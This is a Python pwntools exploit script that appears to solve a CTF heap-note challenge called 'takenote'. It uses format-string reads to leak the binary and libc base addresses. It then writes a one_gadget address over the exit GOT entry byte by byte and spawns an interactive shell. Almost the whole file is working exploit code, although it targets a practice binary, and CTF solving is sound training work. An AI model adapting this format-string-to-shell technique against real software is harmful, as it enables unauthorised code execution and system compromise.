#!/usr/bin/env python3

from pwn import *

chal_elf = ELF("chal_patched")
libc = ELF("libc-2.31.so")
ld = ELF("ld-2.31.so")

context.binary = chal_elf


def conn():
    #io = remote('takenote.kctf-453514-codelab.kctf.cloud', 1337)
    io = process([chal_elf.path])
#    gdb.attach(io,'''
#b *(run+195)
#c''')

    return io


def main():
    io = conn()

    nnotes = 3
    io.sendline(f'{nnotes}'.encode())

    def fpayload(s):
        wnote(s)
        rnote()
        io.recvuntil(b'Your note reads:\n\n')
        return io.recvline()

    def wnote(s, idx=0, enc=False):
        log.info("payload = %s" % repr(s))
        io.sendline(b'1')
        io.sendline(f'{idx}'.encode())
        if not enc:
            io.sendline(s.encode())
        else:
            io.sendline(s)

    def rnote(idx=0):
        io.sendline(b'2')
        io.sendline(f'{idx}'.encode())
        io.recvuntil(b'Your note reads:\n\n')
        return io.recvline()

    def gorop():
        io.sendline(b'3')

    def write_what_where(where, what):
        for i in range(8):
            payload = fmtstr_payload(12, {where + i: (what >> (i * 8)) & 0xff},
                write_size="byte", strategy="small", badbytes=b"\n")
            wnote(payload, enc=True)
            log.info(f'arb write -> ({rnote()})')


    wnote('%16$p')
    chal_elf.address = int(rnote().decode().strip(), 0)-(0x1000+0xf0)

    wnote('%3$p')
    libc = int(rnote().decode().strip(), 0)-(0xec077+0x22000)
    log.info(f'chal -> {hex(chal_elf.address)} libc -> {hex(libc)}')
    log.info(f'exit -> {hex(chal_elf.got["exit"])}')
    exit_got = chal_elf.got["exit"]

    write_what_where(exit_got, libc+0xe3b01)

    io.sendline(b'3')
    io.sendline(b'id')
    io.interactive()


if __name__ == "__main__":
    main()
